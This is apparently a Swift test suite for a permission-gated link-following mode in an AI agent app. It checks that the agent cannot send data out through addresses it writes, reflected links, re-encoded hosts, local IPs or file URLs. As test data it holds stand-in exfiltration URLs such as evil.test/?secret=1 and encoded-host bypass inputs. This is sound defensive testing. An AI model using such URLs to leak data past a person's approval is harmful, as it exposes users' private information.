import Foundation
import Testing
@testable import SidefolkCore

/// "Keep reading linked pages in this conversation" (D119, SECURITY T42): each limit, tested.
@Suite struct ResearchModeTests {
    let t: BuiltinEnv
    var executor: ToolExecutor { t.env.executor }
    let agent = Caller.agent(runId: "r")

    init() async throws {
        t = try BuiltinEnv()
        t.fetcher.serve("https://a.test/", html: #"<a href="/next?x=1">Next</a> <a href="https://b.test/page#part">B</a> <a href="mailto:x@y.z">Mail</a> <a href="http://192.168.1.2/">Router</a> <a href="javascript:alert(1)">J</a>"#)
        t.fetcher.serve("https://a.test/next?x=1", html: "<p>Next page</p>")
        t.fetcher.serve("https://b.test/page", html: "<p>B page</p>")
        t.fetcher.serve("https://evil.test/?secret=1", html: "<p>Nope</p>")
        await executor.research.begin(run: "r", thread: "t", continuing: false)
    }

    func read(_ url: String, as caller: Caller? = nil) async -> ToolOutcome {
        await executor.execute(name: "web.fetch", input: ["url": .string(url)], caller: caller ?? agent, tainted: true)
    }

    /// The person's yes on the first page.
    func start() async {
        let answered = t.env.autoAnswer(.keepReading)
        #expect(await read("https://a.test/").isOK)
        #expect(await answered.value?.canKeepReading == true)
    }

    /// Whether a read goes without a card: no one answers here, so a card means a refusal after a short wait.
    func goesWithoutACard(_ url: String) async -> Bool {
        let answered = t.env.autoAnswer(.deny)
        let outcome = await read(url)
        answered.cancel()
        return outcome.isOK
    }

    @Test func aPageSaysWhatItLinksToAndOnlyPagesCount() {
        let page = HTMLText.extract(#"<a href="/x">X</a><a href='y?a=1&amp;b=2'>Y</a><a href="https://o.test/z#f">Z</a><a href="mailto:a@b.c">M</a><a href="http://localhost/">L</a><a href="http://10.0.0.1/">I</a><a href="file:///etc/passwd">F</a>"#)
        let links = HTMLText.links(page.anchors, base: URL(string: "https://a.test/dir/")!)
        #expect(links == ["https://a.test/x", "https://a.test/dir/y?a=1&b=2", "https://o.test/z"])
    }

    /// As hidden text is left out of what the model reads, so is a hidden link.
    @Test func aHiddenLinkIsNoLink() {
        let page = HTMLText.extract(#"<!-- <a href="https://c.test/">C</a> --><script>"<a href='https://s.test/'>"</script><div style="display:none"><a href="https://h.test/">H</a></div><a hidden href="https://i.test/">I</a><p><a href="https://v.test/">V</a></p>"#)
        #expect(page.anchors == ["https://v.test/"])
    }

    /// A page built to make a scan crawl mustn't: this read runs for everyone, on any page.
    @Test func aHostilePageCantSlowTheScan() {
        let page = String(repeating: "<a ", count: 500_000)
        let start = Date()
        _ = HTMLText.extract(page)
        #expect(Date().timeIntervalSince(start) < 5)
    }

    @Test func theModelSeesTheLinksOnlyUnderAYes() async throws {
        let once = t.env.autoAnswer(.allowOnce)
        guard case .ok(let plain) = await read("https://a.test/").status else { Issue.record("not read"); return }
        _ = await once.value
        #expect(!plain.text.contains("Links on this page"), "it costs nobody else anything")
        let answered = t.env.autoAnswer(.keepReading)
        guard case .ok(let r) = await read("https://a.test/").status else { Issue.record("not read"); return }
        _ = await answered.value
        #expect(r.text.contains("Links on this page:\nhttps://a.test/next?x=1"))
        #expect(!r.text.contains("192.168.1.2"), "not a page it could read")
    }

    @Test func untilThePersonSaysSoEveryPageAsks() async throws {
        let answered = t.env.autoAnswer(.allowOnce)
        #expect(await read("https://a.test/").isOK)
        _ = await answered.value
        #expect(await goesWithoutACard("https://a.test/next?x=1") == false)
    }

    @Test func afterTheirYesLinksReadWithoutACardAndAreRecorded() async throws {
        await start()
        #expect(await goesWithoutACard("https://a.test/next?x=1"))
        #expect(await goesWithoutACard("https://b.test/page"), "the link's fragment never leaves the Mac")
        let recent = try await ActivityStore(t.env.db).recent()
        #expect(recent.contains { $0.decision == .research && $0.tool == "web.fetch" })
    }

    /// The heart of it: an address the model wrote can carry what it knows.
    @Test func anAddressTheModelWroteStillAsks() async throws {
        await start()
        #expect(await goesWithoutACard("https://evil.test/?secret=1") == false)
        #expect(await goesWithoutACard("https://a.test/next?x=1&secret=1") == false, "not even a link with something added")
        #expect(!t.fetcher.requested.contains { $0.absoluteString.contains("secret") })
    }

    /// The same address spelled another way would carry a message in the spelling (found in review).
    @Test(arguments: ["https://%61.test/next?x=1", "https://A.test/next?x=1", "https://a.test:/next?x=1", "https://a.test//next?x=1", "HTTPS://a.test/next?x=1", "https://a.test/n%65xt?x=1"])
    func anAddressSpelledAnotherWayStillAsks(address: String) async throws {
        await start()
        #expect(await goesWithoutACard(address) == false)
    }

    /// `%6Cocalhost` reached this Mac whatever the mode (found in review).
    @Test func anEncodedHostIsNeverRead() throws {
        #expect(throws: (any Error).self) { try URLPolicy.checkHost(URL(string: "http://%6Cocalhost:8765/")!) }
        #expect(throws: (any Error).self) { try URLPolicy.checkHost(URL(string: "https://%65vil.test/")!) }
    }

    @Test func aYesIsWorthAFewPages() async throws {
        await start()
        for _ in 0..<ResearchMode.budget { #expect(await goesWithoutACard("https://a.test/next?x=1")) }
        #expect(await goesWithoutACard("https://a.test/next?x=1") == false, "and then it asks again")
    }

    /// A server echoing what the model wrote into a link elsewhere isn't a link it found.
    @Test func aLinkEchoingTheAddressIsNotCounted() async throws {
        t.fetcher.serve("https://reflect.test/search/hunter2secret", html: #"<a href="https://evil.test/hunter2secret">Go</a><a href="https://reflect.test/search/hunter2secret/more">More</a>"#)
        t.fetcher.serve("https://evil.test/hunter2secret", html: "<p>Got it</p>")
        let answered = t.env.autoAnswer(.keepReading)
        #expect(await read("https://reflect.test/search/hunter2secret").isOK)
        _ = await answered.value
        #expect(await goesWithoutACard("https://evil.test/hunter2secret") == false)
    }

    /// Links on a page read before the yes don't count: the person said yes to this page.
    @Test func anEarlierPagesLinksDontCount() async throws {
        t.fetcher.serve("https://c.test/", html: "<p>C</p>")
        let once = t.env.autoAnswer(.allowOnce)
        #expect(await read("https://a.test/").isOK)
        _ = await once.value
        let yes = t.env.autoAnswer(.keepReading)
        #expect(await read("https://c.test/").isOK)
        _ = await yes.value
        #expect(await goesWithoutACard("https://a.test/next?x=1") == false)
    }

    /// It's offered for a plain address, not one with room to write in.
    @Test func itIsntOfferedForAnAddressWithAQuery() async throws {
        let answered = t.env.autoAnswer(.deny)
        _ = await read("https://evil.test/?secret=1")
        #expect(await answered.value?.canKeepReading == false)
    }

    /// After a restart nothing says what an older conversation read.
    @Test func anOlderConversationIsntOffered() async throws {
        await executor.research.begin(run: "old", thread: "from-before", continuing: true)
        let answered = t.env.autoAnswer(.deny)
        _ = await read("https://a.test/", as: .agent(runId: "old"))
        #expect(await answered.value?.canKeepReading == false)
    }

    @Test func anyToolButReadingPagesEndsIt() async throws {
        await start()
        await executor.research.toolReturned("reminders.list", run: "r")
        #expect(await goesWithoutACard("https://a.test/next?x=1") == false)
        await start2()
    }

    /// An extension's tool can't say what it read.
    func start2() async {
        await executor.research.toolReturned("ext.mail.read", run: "r")
        let answered = t.env.autoAnswer(.deny)
        _ = await read("https://a.test/")
        #expect(await answered.value?.canKeepReading == false)
    }

    @Test func aLocalAddressIsNeverRead() async throws {
        await start()
        #expect(await goesWithoutACard("http://192.168.1.2/") == false)
    }

    @Test func readingAnythingPersonalEndsIt() async throws {
        await start()
        #expect(await executor.execute(name: "notes.list", input: .object([:]), caller: agent).isOK)
        #expect(await goesWithoutACard("https://a.test/next?x=1") == false)
        let answered = t.env.autoAnswer(.deny)
        _ = await read("https://a.test/next?x=1")
        #expect(await answered.value?.canKeepReading == false, "and it isn't offered again")
    }

    @Test func itEndsWithinTheHour() async throws {
        await start()
        t.env.clock.advance(ResearchMode.longest + 1)
        #expect(await goesWithoutACard("https://a.test/next?x=1") == false)
    }

    @Test func itHoldsForThisConversationOnly() async throws {
        await start()
        await executor.research.begin(run: "other", thread: "another", continuing: false)
        let answered = t.env.autoAnswer(.deny)
        #expect(!(await read("https://a.test/next?x=1", as: .agent(runId: "other"))).isOK)
        _ = await answered.value
        // A later run of the same conversation keeps it.
        await executor.research.begin(run: "later", thread: "t", continuing: true)
        #expect(await read("https://a.test/next?x=1", as: .agent(runId: "later")).isOK)
    }

    @Test func aDeletedConversationForgetsIt() async throws {
        await start()
        await executor.research.forget(thread: "t")
        #expect(await goesWithoutACard("https://a.test/next?x=1") == false)
    }

    @Test func otherAgentsNeverGetIt() async throws {
        await start()
        #expect(ExternalToolPolicy.all.contains("web.fetch") == false)
    }

    /// Only reading a page: nothing that writes or opens, whatever a page linked.
    @Test func itCoversOnlyReading() async throws {
        await start()
        let answered = t.env.autoAnswer(.deny)
        let opened = await executor.execute(name: "open.url", input: ["url": "https://a.test/next?x=1"], caller: agent, tainted: true)
        #expect(!opened.isOK)
        _ = await answered.value
    }

    @Test func askingEachTimeNeverOffersIt() async throws {
        let env = try BuiltinEnv()
        env.fetcher.serve("https://a.test/", html: "<p>A</p>")
        await env.env.executor.research.begin(run: "r", thread: "t", continuing: false)
        try await env.env.permissions.updatePolicy { $0.internet = .askEachTime }
        let answered = env.env.autoAnswer(.allowOnce)
        _ = await env.env.executor.execute(name: "web.fetch", input: ["url": "https://a.test/"], caller: agent, tainted: true)
        #expect(await answered.value?.canKeepReading == false)
    }
}
